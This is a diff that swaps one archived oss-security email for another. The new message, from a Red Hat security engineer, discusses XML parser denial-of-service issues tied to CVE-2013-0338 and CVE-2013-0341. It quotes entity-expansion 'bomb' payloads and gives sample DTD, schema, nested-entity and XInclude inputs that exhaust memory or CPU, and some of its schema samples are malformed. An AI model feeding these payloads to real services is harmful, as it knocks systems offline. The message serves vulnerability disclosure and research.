@@ -1,25 +1,265 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2013/01/28/1
-Message-ID: <20130128085648.GB18001@kludge.henri.nerv.fi>
-Date: Mon, 28 Jan 2013 10:56:48 +0200
-From: Henri Salo <henri@...v.fi>
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2013/02/22/19
+Message-ID: <233116504.3539390.1361543109852.JavaMail.root@redhat.com>
+Date: Fri, 22 Feb 2013 09:25:09 -0500 (EST)
+From: Florian Weimer <fweimer@...hat.com>
 To: oss-security@...ts.openwall.com
-Cc: Andrew Nacin <nacin@...dpress.org>, security@...dpress.org
-Subject: CVE request: WordPress 3.1.4 (and 3.2 Release Candidate 3)
+Cc: Mitre CVE assign department <cve-assign@...re.org>
+Subject: Re: CVEs for libxml2 and expat internal and external XML entity expansion
 Content-Type: text/plain; charset=utf-8
 
-Hello,
+On 02/22/2013 06:44 AM, Kurt Seifried wrote:
+> -----BEGIN PGP SIGNED MESSAGE-----
+> Hash: SHA1
+>
+> So here are the CVE's for the two big ones, libxml2 and expat. Both
+> are affected by the expansion of internal entities (which can be used
+> to consume resources) and external entities (which can cause a denial
+> of service against other services, be used to port scan, etc.).
+>
+> To be clear:
+>
+> ====================
+> Internal entity expansion refers to the exponential/quadratic/fast
+> linear expansion of XML entities, e.g.:
+> ====================
+> <!DOCTYPE xmlbomb [
+> <!ENTITY a "1234567890" >
+> <!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;">
+> <!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;">
+> <!ENTITY d "&c;&c;&c;&c;&c;&c;&c;&c;">
+> ]>
+> <bomb>&d;</bomb>
+>
+> or
+>
+> <!DOCTYPE bomb [
+> <!ENTITY a "xxxxxxx... a couple of ten thousand chars">
+> ]>
+> <bomb>&a;&a;&a;... repeat</bomb>
+>
+> Which causes resources to be consumed
 
-Vulnerabilities fixed in WordPress 3.1.4[1] does not yet have CVE identifiers. As far as I can tell there is three different issues[2][3][4]. Details of issue OSVDB:73721 from Andrew Nacin below:
+The real challenge is when the triggering entity reference is inside an
+attribute, that is:
 
-Using specially crafted requests under certain conditions, users without the ability to write with unfiltered HTML could add some to a post, and could update posts where they did not have a permission to do so. The relevant changeset is: http://core.trac.wordpress.org/changeset/18368/branches/3.1
+   <bomb attr="&d;"/>
 
-1: http://wordpress.org/news/2011/06/wordpress-3-1-4/
-2: http://osvdb.org/73721 WordPress Unspecified Access Restriction Bypass
-3: http://osvdb.org/73722 WordPress wp-admin/edit-tags.php Multiple Parameter SQL Injection
-4: http://osvdb.org/73723 WordPress wp-admin/link-manager.php Multiple Parameter SQL Injection
+With many APIs, this causes essentially unbounded memory allocation
+*inside* the XML library.  If the entity reference is inside a text
+node, data can be passed piecewise to the calling code, so memory usage
+inside the XML library can be remain roughly constant.
 
-Please note that these need to be CVE-2011-XXXX, thanks.
+Note that there are several other denial-of-service vectors related to
+DTD and schema validation.  I'm not yet very far in researching which
+applications are affected.  A lot of this was documented in research
+papers in the 80s and early 90s (few of which are accessible to me,
+unfortunately), and the SGML designers were likely familiar with it.
 
---
-Henri Salo
+* Non-deterministic content models
+
+The XML DTD specification and the XML schema specification require that
+content models are deterministic, that is, something like this is not
+permitted:
+
+    <!ELEMENT root
+     (((a|b)
+     |((a|b),(a|b))
+     |((a|b),(a|b),(a|b))
+     |((a|b),(a|b),(a|b),(a|b))
+    >
+
+   <xs:element name="root">
+     <xs:complexType>
+       <xs:sequence>
+         <xs:choice>
+           <xs:choice>
+             <xs:element ref="a"/>
+             <xs:element ref="b"/>
+           </xs:choice>
+           <xs:sequence>
+             <xs:choice>
+               <xs:element ref="a"/>
+               <xs:element ref="b"/>
+             </xs:choice>
+             <xs:choice>
+               <xs:element ref="a"/>
+               <xs:element ref="b"/>
+             </xs:choice>
+           </xs:sequence>
+           <xs:sequence>
+             <xs:choice>
+               <xs:element ref="a"/>
+               <xs:element ref="b"/>
+             </xs:choice>
+             <xs:choice>
+               <xs:element ref="a"/>
+               <xs:element ref="b"/>
+             </xs:choice>
+             <xs:choice>
+               <xs:element ref="a"/>
+               <xs:element ref="b"/>
+             </xs:choice>
+           </xs:sequence>
+           <xs:sequence>
+             <xs:choice>
+               <xs:element ref="a"/>
+               <xs:element ref="b"/>
+             </xs:choice>
+             <xs:choice>
+               <xs:element ref="a"/>
+               <xs:element ref="b"/>
+             </xs:choice>
+             <xs:choice>
+               <xs:element ref="a"/>
+               <xs:element ref="b"/>
+             </xs:choice>
+             <xs:choice>
+               <xs:element ref="a"/>
+               <xs:element ref="b"/>
+             </xs:choice>
+             <xs:choice>
+               <xs:element ref="a"/>
+               <xs:element ref="b"/>
+             </xs:choice>
+           </xs:sequence>
+           </xs:choice>
+         </xs:sequence>
+       </xs:sequence>
+     </xs:complexType>
+   </xs:element>
+
+Some implementations do not check for this restriction and still convert
+the content model to a DFA, which can have exponential size for such inputs.
+
+Relax NG allows non-deterministic content models:
+
+     <element name="root">
+       <choice>
+         <choice>
+           <ref name="a"/>
+           <ref name="b"/>
+         </choice>
+         <group>
+           <choice>
+             <ref name="a"/>
+             <ref name="b"/>
+           </choice>
+           <choice>
+             <ref name="a"/>
+             <ref name="b"/>
+           </choice>
+         </group>
+         <group>
+           <choice>
+             <ref name="a"/>
+             <ref name="b"/>
+           </choice>
+           <choice>
+             <ref name="a"/>
+             <ref name="b"/>
+           </choice>
+           <choice>
+             <ref name="a"/>
+             <ref name="b"/>
+           </choice>
+         </group>
+         <group>
+           <choice>
+             <ref name="a"/>
+             <ref name="b"/>
+           </choice>
+           <choice>
+             <ref name="a"/>
+             <ref name="b"/>
+           </choice>
+           <choice>
+             <ref name="a"/>
+             <ref name="b"/>
+           </choice>
+           <choice>
+             <ref name="a"/>
+             <ref name="b"/>
+           </choice>
+         </group>
+         </choice>
+       </group>
+     </element>
+
+I'm not sure if it is possible to validate against Relax NG schemas in
+less than quadratic time.  Relax NG does not have repeats, which makes
+more tractable (see below).
+
+* Entity references in content models
+
+DTDs can contain entity references in content models:
+
+    <!ELEMENT e0 EMPTY>
+    <!ENTITY % e1 "(e0,e0)">
+    <!ENTITY % e2 "(%e1;,%e1;,%e1;,%e1;,%e1;,%e1;,%e1;,%e1;,%e1;,%e1;)">
+    <!ENTITY % e3 "(%e2;,%e2;,%e2;,%e2;,%e2;,%e2;,%e2;,%e2;,%e2;,%e2)">
+    <!ELEMENT root (%e3;)?>
+
+Those are not permitted in the internal subset by the specification, but
+there might be implementations out there which still expand them.  And
+it is possible to implement this expansion efficiently because of the
+deterministic content model.
+
+* Expansion of content models
+
+XML Schema offers repeats:
+
+   <xs:element name="root">
+     <xs:complexType>
+       <xs:sequence maxOccurs="5000">
+         <xs:choice>
+           <xs:choice>
+             <xs:element ref="a"/>
+             <xs:element ref="b"/>
+             <xs:element ref="c"/>
+          </xs:choice>
+         </xs:choice>
+       </xs:sequence>
+     </xs:complexType>
+   </xs:element>
+
+If the repeats are expanded before generating the automaton, vast
+amounts of memory and processing time are required.  (This is also
+visible with GNU egrep.)
+
+* General regular expression issues
+
+XML Schema embeds textual regular expressions (and does not restrict
+them to a deterministic subset), so the usual issues when processing
+them apply: huge compilation times and compile-time memory requires,
+huge run-time requires for matching certain inputs.
+
+* Other kinds of external references
+
+XML Schema seems to support external schema references:
+
+    <root xmlns:xsi= "http://www.w3.org/2001/XMLSchema-instance"
+       xsi:noNamespaceSchemaLocation="http://www.example.com/xsd"/>
+
+Or, inside the schema:
+
+    <xs:schema xmlns:xs="http://www.w3.org/2001/XMLSchema">
+      <xs:include schemaLocation="schema.xsd"/>
+    </xs:schema>
+
+There is also XInclude:
+
+    <xi:include xmlns:xi="http://www.w3.org/2001/XInclude"
+                href="http://www.example.com/XInclude" />
+
+ > Please use CVE-2013-0338 for libxml2 internal entity expansion
+
+Hasn't libxml2 got countermeasures for that?
+
+ > Please use CVE-2013-0341 for expat external entities expansion
+
+I don't think expat resolves external entities at all.  Therefore, the
+vulnerability resides entirely in the code which uses expat.
+
+-- 
+Florian Weimer / Red Hat Product Security Team
